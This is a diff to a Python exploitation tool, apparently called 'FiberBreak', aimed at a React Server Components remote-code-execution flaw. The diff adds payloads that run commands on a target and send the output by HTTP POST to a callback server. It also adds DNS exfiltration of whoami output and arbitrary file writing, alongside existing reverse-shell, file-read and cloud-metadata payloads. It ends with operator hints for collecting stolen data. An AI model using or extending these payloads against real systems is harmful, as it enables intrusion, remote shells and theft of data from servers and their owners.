@@ -1,10 +1,3 @@
-#!/usr/bin/env python3
-"""
-FiberBreak
-React2Shell (CVE-2025-55182) Exploitation Tool
-Tool for detection and exploitation of React Server Components RCE
-"""
-
 import requests
 import argparse
 import json
@@ -14,6 +7,7 @@ from typing import Optional, Dict, List, Tuple
 from dataclasses import dataclass
 import base64
 import concurrent.futures
+import urllib.parse
 
 
 @dataclass
@@ -38,7 +32,7 @@ class React2Shell:
         })
     
     @staticmethod
-    def generate_payload(command: str, payload_type: str = "simple") -> str:
+    def generate_payload(command: str, payload_type: str = "simple", callback: str = "") -> str:
         """Generate exploitation payloads"""
         
         base_gadget = {
@@ -60,7 +54,12 @@ class React2Shell:
         }
         
         if payload_type == "simple":
+            # Basic command execution (blind)
             prefix = f'process.mainModule.require("child_process").execSync("{command}");//'
+        
+        elif payload_type == "output":
+            # Command with output exfiltration via HTTP callback
+            prefix = f'process.mainModule.require("child_process").exec("{command}",(e,o)=>{{require("https").request("{callback}",{{method:"POST"}}).end(o)}});//'
         
         elif payload_type == "reverse_shell":
             # command format: "lhost:lport"
@@ -69,9 +68,17 @@ class React2Shell:
             prefix = f'process.mainModule.require("child_process").exec("bash -c \\"{shell_cmd}\\"");//'
         
         elif payload_type == "dns_exfil":
-            # command format: "data:domain"
-            data, domain = command.split(':')
+            # command format: "data:domain" or just "domain" (uses whoami)
+            if ':' in command:
+                data, domain = command.split(':', 1)
+            else:
+                data, domain = "whoami", command
             prefix = f'process.mainModule.require("child_process").execSync("nslookup $({data}).{domain}");//'
+        
+        elif payload_type == "http_exfil":
+            # command format: "cmd:callback_url"
+            cmd, callback_url = command.split(':', 1)
+            prefix = f'process.mainModule.require("child_process").exec("{cmd}",(e,o)=>{{require("https").request("{callback_url}",{{method:"POST"}}).end(o)}});//'
         
         elif payload_type == "file_read":
             # command format: "filepath:callback_url"
@@ -102,6 +109,12 @@ class React2Shell:
         elif payload_type == "stealth_beacon":
             # command is beacon domain
             prefix = f'process.mainModule.require("child_process").execSync("nslookup $(hostname).$(whoami).{command}");//'
+        
+        elif payload_type == "write_file":
+            # command format: "filepath:content" (content will be base64 encoded)
+            filepath, content = command.split(':', 1)
+            content_b64 = base64.b64encode(content.encode()).decode()
+            prefix = f'process.mainModule.require("fs").writeFileSync("{filepath}",Buffer.from("{content_b64}","base64"));//'
         
         else:
             raise ValueError(f"Unknown payload type: {payload_type}")
@@ -149,7 +162,7 @@ Content-Disposition: form-data; name="1"
             start = time.time()
             
             # Use stealth detection payload
-            payload = self.generate_payload("", "stealth_beacon")
+            payload = self.generate_payload("example.com", "stealth_beacon")
             response = self._send_payload(url, payload)
             
             response_time = time.time() - start
@@ -178,10 +191,10 @@ Content-Disposition: form-data; name="1"
         ]
         return sum(indicators) >= 2
     
-    def exploit(self, url: str, command: str, payload_type: str = "simple") -> ScanResult:
+    def exploit(self, url: str, command: str, payload_type: str = "simple", callback: str = "") -> ScanResult:
         """Execute exploitation"""
         try:
-            payload = self.generate_payload(command, payload_type)
+            payload = self.generate_payload(command, payload_type, callback)
             response = self._send_payload(url, payload)
             
             rce_confirmed = response.status_code in [200, 500]
@@ -218,7 +231,7 @@ Content-Disposition: form-data; name="1"
         return results
     
     def run_impact_assessment(self, url: str, callback: str) -> Dict:
-        """Run impact assessment"""
+        """Run comprehensive impact assessment"""
         print("\n[*] Running Impact Assessment...")
         print(f"[*] Target: {url}")
         print(f"[*] Callback: {callback}\n")
@@ -298,9 +311,9 @@ def print_results(results: List[ScanResult]):
 
 
 def print_impact_summary(results: Dict):
-    """Print impact summary"""
+    """Print impact assessment summary"""
     print("\n" + "="*60)
-    print("IMPACT SUMMARY")
+    print("IMPACT ASSESSMENT SUMMARY")
     print("="*60)
     
     total = len(results['tests'])
@@ -401,6 +414,9 @@ Payload types:
     if args.mode == 'assess' and not args.callback:
         parser.error("assess mode requires --callback")
     
+    if args.type == 'output' and not args.callback:
+        parser.error("output payload type requires --callback")
+    
     # Confirmation for exploit mode
     if args.mode in ['exploit', 'assess']:
         print("[!] This will perform REAL exploitation")
@@ -438,8 +454,22 @@ Payload types:
         results = []
         for target in targets:
             print(f"[*] Exploiting: {target}")
-            result = tool.exploit(target, args.command, args.type)
+            result = tool.exploit(target, args.command, args.type, args.callback or "")
             print(f"[{'✓' if result.rce_confirmed else '✗'}] RCE {'confirmed' if result.rce_confirmed else 'failed'}")
+            
+            # Additional instructions based on payload type
+            if result.rce_confirmed:
+                if args.type == 'dns_exfil':
+                    domain = args.command.split(':')[-1]
+                    print(f"    Check DNS logs at {domain} for exfiltrated data")
+                elif args.type in ['output', 'http_exfil', 'file_read', 'env_dump', 'aws_metadata', 'recon']:
+                    print(f"    Check callback server {args.callback} for command output")
+                elif args.type == 'reverse_shell':
+                    print(f"    Check your listener for incoming connection")
+                elif args.type == 'write_file':
+                    filepath = args.command.split(':')[0]
+                    print(f"    File written to {filepath}")
+            
             results.append(result)
     
     elif args.mode == 'assess':
